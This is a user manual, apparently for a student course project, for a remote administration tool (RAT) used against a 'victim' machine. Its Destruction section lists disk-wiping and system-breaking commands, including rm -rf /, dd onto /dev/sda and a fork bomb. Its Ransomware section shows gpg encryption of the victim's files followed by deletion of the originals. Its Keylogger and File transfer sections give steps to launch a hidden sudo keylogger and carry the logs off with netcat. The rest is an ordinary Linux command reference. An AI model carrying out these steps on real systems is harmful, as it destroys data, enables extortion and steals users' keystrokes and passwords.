# REMOTE ADMINISTRATION TOOL 
# USER MANUAL

Made for 2IC80 by Daan, Fabian and Floris
##########################################


### Introduction
---------------
This manual offers guidance for using our remote administration tool also known as a RAT.
The purpose of this manual is to showcase the wide variety of functionalities offered by this RAT and can therefore be used as an aid to efficiently and successfully use this tool.


### Content
---------------
1. Destruction
2. Ransomware
3. Keylogger
4. File transfer
5. Commands


### Destruction
---------------
Here one can find commands which can seriously damage a system and render is useless.
One can consult the following page to obtain a table of commands frequently used by attackers.
https://www.uptycs.com/blog/linux-commands-and-utilities-commonly-used-by-attackers

* rm -rf /
This command is used to delete all the directories and files of a linux system and therefore is the equivalent of deleting system32 for Windows rendering your system useless.

* command >/dev/sda
Overwrites hard drive data with the result of a command. This will destroy all data on the hard drive. One can replace command with a command of your choosing, for example shred. 

* :(){ :|:& };:
Fork bomb which runs foreever in the foreground while duplicating itself in the background eventually, quite fast, leads to your computer freezing or crashing.

* \> file
Wipes the content of a file. Replace file.extension with a file of your choosing.

* wget link
Can be used to download malicious files in the terminal.

* history | sh
Executes all commands that were executed in the terminal.

* dd if=/dev/random of=/dev/sda
Fils your hard drive with random data causing freezes and system failures.

* chmod -R 777 /
Allows all users to read, write and execute all files on the system.


### Ransomware
---------------
Since GPG is installed on the victim's computer, one can use GPG to make an encrypted copy of the file and make it password protected. The old, unencrypted file, can be deleted and therefore only the encrypted files remain. 

* gpg -c filename.extension
Encrypts the file. After this command you are asked to give a password and repeat it.

* gpg filename.extension.gpg
Decrypts the file. One must use the command used to encrypt the file to decrypt it.

* tar czf myfiles.tar.gz mydirectory/
Compresses a directory into a encryptable file.

* tar -czvf file.tar.gz /home/vivek/data/ /home/vivek/pics/ /home/vivek/.accounting.db
Compresses two directories and a file into a encryptable file.

* tar -xzvf file.tar.gz
Exctracts an archive.


### Keylogger
---------------
Before one can start to use the keylogger, the victim must have the logger.py file downloaded somewhere on its computer. This is most easily done via the file transfer explained in the section below. 

Once a connection is established, acces to the victim's terminal is acquired and logger.py is available, one can follow the code below in the same order to use the keylogger.

echo -e '#!/bin/sh\n echo [root password] | sudo -S python3 logger.py x & > logger.sh
A .sh file will be created in the same directory with this code.
The x must be replaced with a number after the amount of characters typed must be stored, usually this is x = 10.

chmod +x logger.sh
Make this file executable.

gnome-terminal -x ./logger.sh
Execute the keylogger with a new terminal unseen in the background.

The extracted data will be stored in the datalog.txt file.
One can transfer this file to the ownner by using netcat in reverse.


### File transfer
---------------
We can exchange files with the victim by using Netcat.
For a more detailed guide, consult this page https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/.

Run the following command on the receiving end:
nc -l -p 1234 > name.extension

Run the following command on the sending end:
nc -w 3 [destination ip] 1234 < name.extension

After the second command ran, the given file is now available on the receiving machine in the directory where the connection was established via the terminal.


### Network
---------------
Here one can find commands useful for networking and scanning the victim's network.
One can always install NMAP for further and deeper network scanning of the LAN.
More detailed information about each command can be found via the link down below.
https://mindmajix.com/linux-networking-commands-best-examples

* ifconfig 
Used to obtain details about the network and specific interface.

* ip
Updated variant of ifconfig.

* traceroute destination
Provides names and identifies every device on the path and follows route to destination.

* tracepath
Used to detect network delays.

* ping
Checks for connectivity between two nodes in a network.

* netstat
Provides statistical figures about different interfaces such as open sockets, routing tables and connections.

* ss 
Updated variant of netstat.

* route 
Displays and manipulates the routing table of your system.

* host
Displays the domain name for a given IP address and IP address for given host name.

* arp
Used to view and add content to the kernels ARP table.

* iwconfig
Used to configure wireless network interface.

* whois
Fetch all information related to a website.

* iftop
Used for traffic monitoring.

* tcpdump
Displays the traffic passing through the network interface.


### Commands
---------------
Here one can find a list of useful commands to use once a connection with the victim's terminal is established.

* pwd
Find the absolute path of the current working directory.

* cd x
Navigate through the directories.
	cd /home/username/Desktop, one moves to this directory.
	cd .., one moves one directory up.
	cd-, one moves to the previous directory.
	cd, one moves to the home directory.

* ls x
View contents of current directory.
	ls -R lists all files in sub-directories as well.
	ls -a lists hidden files as well.
	ls -al lists files and directories with propperties.

* cat name.extension
Lists and shows the contents of a file on standard output.

* cp name.extension destination
Creates a copy of a file.

* mv
Move files or rename a file.
	mv name.extension destination to move a file
	mv name.extension newname.extension to rename a file.

* mkdir name
Creates a directory.

* rmdir name
Deletes a directory.

* rm name(.extension)
Deletes a directory or file and its content.

* locate name.extension
Searches and returns the directory (location) of a file.
	locate name -i is case insensitive.
	locate school*note searches for a file with both school and note in its name.

* find name(.extension)
Searches and returns the directory (location) of a file and/or directory within a certain directory. 
	find /home/ -name notes.txt searches notes.txt in the home directory and subdirectories. 
	find . -name notes.txt searches in current directory.
	find / -type d -name notes.txt looks for directories.

* grep word name.extension
Searches for a word in a file.

* sudo 
Runs commands as administrator, password is required.

* df
Shows a report of the disk space usage.

* du -h name(.extension)
Shows how much a directory or files takes up.

* head -n x name.extension
Shows the first x lines of the given file.

* tail -n name.extension
Shows the last ten lines of a given file.

* diff name.extension name2.extension
Compares two files line by line and outputs the lines which differ.

* zip / unzip name(s)/folder
Used to zip or unzip files.

* chmod 
Used to change, read, write and execute permissions of files and directories.
Consult this website for a detailed overview.
https://www.computerhope.com/unix/uchmod.htm

* kill option pid
Used to shutdown processes which are running.
	SIGTERM option requests a programme to stop with save and store time.
	SIGKILL option forces a programme to stop immediately.

* ping domain/ip
Used to check the connectivity status to a server.

* uname
Shows the detailed propperties of the linux system.

* history
Shows a list of commands used in the past.

* man command
Shows the manual for a command.

* help
Shows a user manual / help list for terminal commands for linux.


### End of manual!
---------------
